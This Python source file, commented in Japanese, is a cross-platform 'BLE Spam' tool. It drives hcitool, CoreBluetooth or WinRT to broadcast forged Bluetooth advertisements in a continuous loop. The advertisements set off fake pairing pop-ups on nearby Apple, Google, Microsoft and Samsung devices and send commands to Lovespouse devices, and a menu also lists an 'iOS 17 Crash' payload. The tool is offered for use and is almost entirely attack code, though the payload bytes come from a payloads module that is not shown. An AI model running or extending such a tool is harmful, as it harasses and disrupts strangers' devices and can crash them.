"""
BLE Spam - Cross-platform (Windows EXE / macOS / Linux)
Usage:
    python ble_spam.py                  # インタラクティブメニュー
    python ble_spam.py --target apple   # Apple系を連続送信
    python ble_spam.py --target all     # 全種類ランダム送信
"""

import sys
import time
import struct
import signal
import argparse
import platform
from payloads import (
    ALL_GENERATORS,
    MANUFACTURER_APPLE, MANUFACTURER_MICROSOFT,
    MANUFACTURER_SAMSUNG, MANUFACTURER_TYPO,
    UUID_GOOGLE_FAST_PAIR,
    APPLE_DEVICES, APPLE_ACTION_MODALS,
    FAST_PAIR_DEVICES, SWIFT_PAIR_NAMES,
    SAMSUNG_BUDS, SAMSUNG_WATCHES,
)

SYSTEM = platform.system()
running = True


def signal_handler(sig, frame):
    global running
    running = False
    print("\n停止中...")


signal.signal(signal.SIGINT, signal_handler)


# ============================================================
# Platform-specific BLE Advertisers
# ============================================================

class BLEAdvertiser:
    """Base class for BLE advertising"""

    def start(self, manufacturer_id: int = None, data: bytes = None,
              service_uuid: str = None, service_data: bytes = None,
              interval_ms: int = 100):
        raise NotImplementedError

    def stop(self):
        raise NotImplementedError


class MacOSAdvertiser(BLEAdvertiser):
    """macOS: CoreBluetooth via pyobjc"""

    def __init__(self):
        try:
            import objc
            from CoreBluetooth import (
                CBPeripheralManager,
                CBAdvertisementDataManufacturerDataKey,
                CBAdvertisementDataLocalNameKey,
                CBAdvertisementDataServiceUUIDsKey,
            )
            from Foundation import NSData, CBUUID
            self.objc = objc
            self.CBPeripheralManager = CBPeripheralManager
            self.CBAdvertisementDataManufacturerDataKey = CBAdvertisementDataManufacturerDataKey
            self.CBAdvertisementDataLocalNameKey = CBAdvertisementDataLocalNameKey
            self.CBAdvertisementDataServiceUUIDsKey = CBAdvertisementDataServiceUUIDsKey
            self.NSData = NSData
            self.CBUUID = CBUUID
            self.manager = CBPeripheralManager.alloc().init()
            time.sleep(0.5)  # wait for BT init
        except ImportError:
            raise RuntimeError(
                "pyobjc が必要です: pip install pyobjc-framework-CoreBluetooth"
            )

    def start(self, manufacturer_id=None, data=None,
              service_uuid=None, service_data=None, interval_ms=100):
        ad_dict = {}

        if manufacturer_id is not None and data is not None:
            # manufacturer_id (2 bytes LE) + data
            mfr_bytes = struct.pack("<H", manufacturer_id) + data
            ns_data = self.NSData.dataWithBytes_length_(mfr_bytes, len(mfr_bytes))
            # macOS ではCBAdvertisementDataManufacturerDataKeyがサポートされる場合がある
            # ただしApple公式にはサポート外。直接HCIを使う方が確実
            try:
                ad_dict["kCBAdvDataManufacturerData"] = ns_data
            except Exception:
                pass

        if service_uuid and service_data:
            uuid = self.CBUUID.UUIDWithString_(service_uuid)
            ad_dict[self.CBAdvertisementDataServiceUUIDsKey] = [uuid]

        self.manager.startAdvertising_(ad_dict)

    def stop(self):
        self.manager.stopAdvertising()


class MacOSHCIAdvertiser(BLEAdvertiser):
    """macOS: Raw HCI commands via subprocess (要root)"""

    def __init__(self):
        import subprocess
        self.subprocess = subprocess

    def start(self, manufacturer_id=None, data=None,
              service_uuid=None, service_data=None, interval_ms=100):
        if manufacturer_id is not None and data is not None:
            mfr_bytes = struct.pack("<H", manufacturer_id) + data
            # AD structure: length, type(0xFF=manufacturer), data
            ad_length = len(mfr_bytes) + 1
            ad_data = bytes([ad_length, 0xFF]) + mfr_bytes
            hex_str = ad_data.hex()
            total_len = len(ad_data)

            # HCI LE Set Advertising Data (OCF=0x0008, OGF=0x08)
            cmd = f"hcitool -i hci0 cmd 0x08 0x0008 {total_len:02x}"
            for b in ad_data:
                cmd += f" {b:02x}"
            # zero-pad to 31 bytes
            for _ in range(31 - total_len):
                cmd += " 00"

            try:
                self.subprocess.run(cmd.split(), capture_output=True)
                # Enable advertising
                self.subprocess.run(
                    "hcitool -i hci0 cmd 0x08 0x000a 01".split(),
                    capture_output=True,
                )
            except Exception as e:
                print(f"HCI error: {e}")

    def stop(self):
        try:
            self.subprocess.run(
                "hcitool -i hci0 cmd 0x08 0x000a 00".split(),
                capture_output=True,
            )
        except Exception:
            pass


class WindowsAdvertiser(BLEAdvertiser):
    """Windows: WinRT BLE Advertisement Publisher"""

    def __init__(self):
        try:
            import winrt.windows.devices.bluetooth.advertisement as ble_adv
            import winrt.windows.storage.streams as streams
            self.ble_adv = ble_adv
            self.streams = streams
            self.publisher = None
        except ImportError:
            raise RuntimeError(
                "winrt が必要です: pip install winrt-Windows.Devices.Bluetooth.Advertisement "
                "winrt-Windows.Storage.Streams"
            )

    def start(self, manufacturer_id=None, data=None,
              service_uuid=None, service_data=None, interval_ms=100):
        self.stop()
        self.publisher = self.ble_adv.BluetoothLEAdvertisementPublisher()
        adv = self.publisher.advertisement

        if manufacturer_id is not None and data is not None:
            mfr = self.ble_adv.BluetoothLEManufacturerData()
            mfr.company_id = manufacturer_id
            writer = self.streams.DataWriter()
            for b in data:
                writer.write_byte(b)
            mfr.data = writer.detach_buffer()
            adv.manufacturer_data.append(mfr)

        if service_uuid and service_data:
            import uuid
            sd = self.ble_adv.BluetoothLEAdvertisementDataSection()
            sd.data_type = 0x16  # Service Data - 128-bit UUID
            writer = self.streams.DataWriter()
            # Write UUID bytes (little-endian) + service data
            uuid_bytes = uuid.UUID(service_uuid).bytes_le
            for b in uuid_bytes:
                writer.write_byte(b)
            for b in service_data:
                writer.write_byte(b)
            sd.data = writer.detach_buffer()
            adv.data_sections.append(sd)

        self.publisher.start()

    def stop(self):
        if self.publisher:
            try:
                self.publisher.stop()
            except Exception:
                pass
            self.publisher = None


class LinuxAdvertiser(BLEAdvertiser):
    """Linux: BlueZ HCI commands"""

    def __init__(self):
        import subprocess
        self.subprocess = subprocess
        # Check if hcitool is available
        result = self.subprocess.run(
            ["which", "hcitool"], capture_output=True
        )
        if result.returncode != 0:
            raise RuntimeError("hcitool not found. Install bluez: sudo apt install bluez")

    def start(self, manufacturer_id=None, data=None,
              service_uuid=None, service_data=None, interval_ms=100):
        if manufacturer_id is not None and data is not None:
            mfr_bytes = struct.pack("<H", manufacturer_id) + data
            ad_length = len(mfr_bytes) + 1
            ad_data = bytes([ad_length, 0xFF]) + mfr_bytes
            total_len = len(ad_data)

            cmd_parts = ["hcitool", "-i", "hci0", "cmd", "0x08", "0x0008",
                         f"{total_len:02x}"]
            for b in ad_data:
                cmd_parts.append(f"{b:02x}")
            for _ in range(31 - total_len):
                cmd_parts.append("00")

            self.subprocess.run(cmd_parts, capture_output=True)
            self.subprocess.run(
                ["hcitool", "-i", "hci0", "cmd", "0x08", "0x000a", "01"],
                capture_output=True,
            )

    def stop(self):
        self.subprocess.run(
            ["hcitool", "-i", "hci0", "cmd", "0x08", "0x000a", "00"],
            capture_output=True,
        )


def get_advertiser() -> BLEAdvertiser:
    """プラットフォームに応じたAdvertiserを返す"""
    if SYSTEM == "Darwin":
        try:
            return MacOSAdvertiser()
        except RuntimeError:
            print("CoreBluetooth使用不可。HCIモードを試行...")
            return MacOSHCIAdvertiser()
    elif SYSTEM == "Windows":
        return WindowsAdvertiser()
    elif SYSTEM == "Linux":
        return LinuxAdvertiser()
    else:
        raise RuntimeError(f"未対応プラットフォーム: {SYSTEM}")


# ============================================================
# Main Application
# ============================================================

TARGET_MAP = {
    "apple": [
        "apple_new_device", "apple_not_your_device",
        "apple_new_airtag", "apple_action_modal",
    ],
    "google": ["google_fast_pair"],
    "microsoft": ["microsoft_swift_pair"],
    "samsung": ["samsung_buds", "samsung_watch"],
    "lovespouse": ["lovespouse_play", "lovespouse_stop"],
    "all": list(ALL_GENERATORS.keys()),
}


def show_menu():
    print("""
╔══════════════════════════════════════╗
║       BLE Spam - Desktop Edition     ║
╠══════════════════════════════════════╣
║  1. Apple - New Device Pop-up        ║
║  2. Apple - Not Your Device          ║
║  3. Apple - New AirTag               ║
║  4. Apple - Action Modal             ║
║  5. Apple - iOS 17 Crash (patched)   ║
║  6. Google Fast Pair                 ║
║  7. Microsoft Swift Pair             ║
║  8. Samsung Buds                     ║
║  9. Samsung Watch                    ║
║ 10. Lovespouse Play                  ║
║ 11. Lovespouse Stop                  ║
║ 12. Kitchen Sink (全種類ランダム)    ║
║  0. 終了                             ║
╚══════════════════════════════════════╝
""")


MENU_MAP = {
    "1": "apple_new_device",
    "2": "apple_not_your_device",
    "3": "apple_new_airtag",
    "4": "apple_action_modal",
    "5": "apple_ios17_crash",
    "6": "google_fast_pair",
    "7": "microsoft_swift_pair",
    "8": "samsung_buds",
    "9": "samsung_watch",
    "10": "lovespouse_play",
    "11": "lovespouse_stop",
    "12": "all",
}

import random as _random


def spam_loop(advertiser: BLEAdvertiser, generator_keys: list,
              interval_ms: int = 100):
    """ペイロードを連続送信"""
    global running
    running = True
    count = 0
    print(f"送信開始 (Ctrl+C で停止)  interval={interval_ms}ms")
    print("-" * 50)

    while running:
        key = _random.choice(generator_keys)
        gen_func = ALL_GENERATORS[key]
        result = gen_func()

        try:
            if key == "google_fast_pair":
                service_uuid, service_data = result
                advertiser.start(
                    service_uuid=service_uuid,
                    service_data=service_data,
                    interval_ms=interval_ms,
                )
            else:
                mfr_id, payload = result
                advertiser.start(
                    manufacturer_id=mfr_id,
                    data=payload,
                    interval_ms=interval_ms,
                )
            count += 1
            sys.stdout.write(f"\r送信中... #{count}  [{key}]          ")
            sys.stdout.flush()
        except Exception as e:
            print(f"\nError: {e}")

        time.sleep(interval_ms / 1000.0)
        advertiser.stop()

    advertiser.stop()
    print(f"\n停止完了。送信数: {count}")


def main():
    parser = argparse.ArgumentParser(description="BLE Spam - Desktop")
    parser.add_argument("--target", choices=list(TARGET_MAP.keys()),
                        help="ターゲット指定")
    parser.add_argument("--interval", type=int, default=100,
                        help="送信間隔 (ms) デフォルト:100")
    args = parser.parse_args()

    print(f"Platform: {SYSTEM}")
    print("BLE Advertiser を初期化中...")

    try:
        advertiser = get_advertiser()
    except RuntimeError as e:
        print(f"エラー: {e}")
        sys.exit(1)

    print("初期化完了!")

    if args.target:
        keys = TARGET_MAP[args.target]
        spam_loop(advertiser, keys, args.interval)
    else:
        while True:
            show_menu()
            choice = input("選択 > ").strip()
            if choice == "0":
                break
            elif choice in MENU_MAP:
                selected = MENU_MAP[choice]
                if selected == "all":
                    keys = list(ALL_GENERATORS.keys())
                else:
                    keys = [selected]
                spam_loop(advertiser, keys, args.interval)
            else:
                print("無効な選択です")


if __name__ == "__main__":
    main()
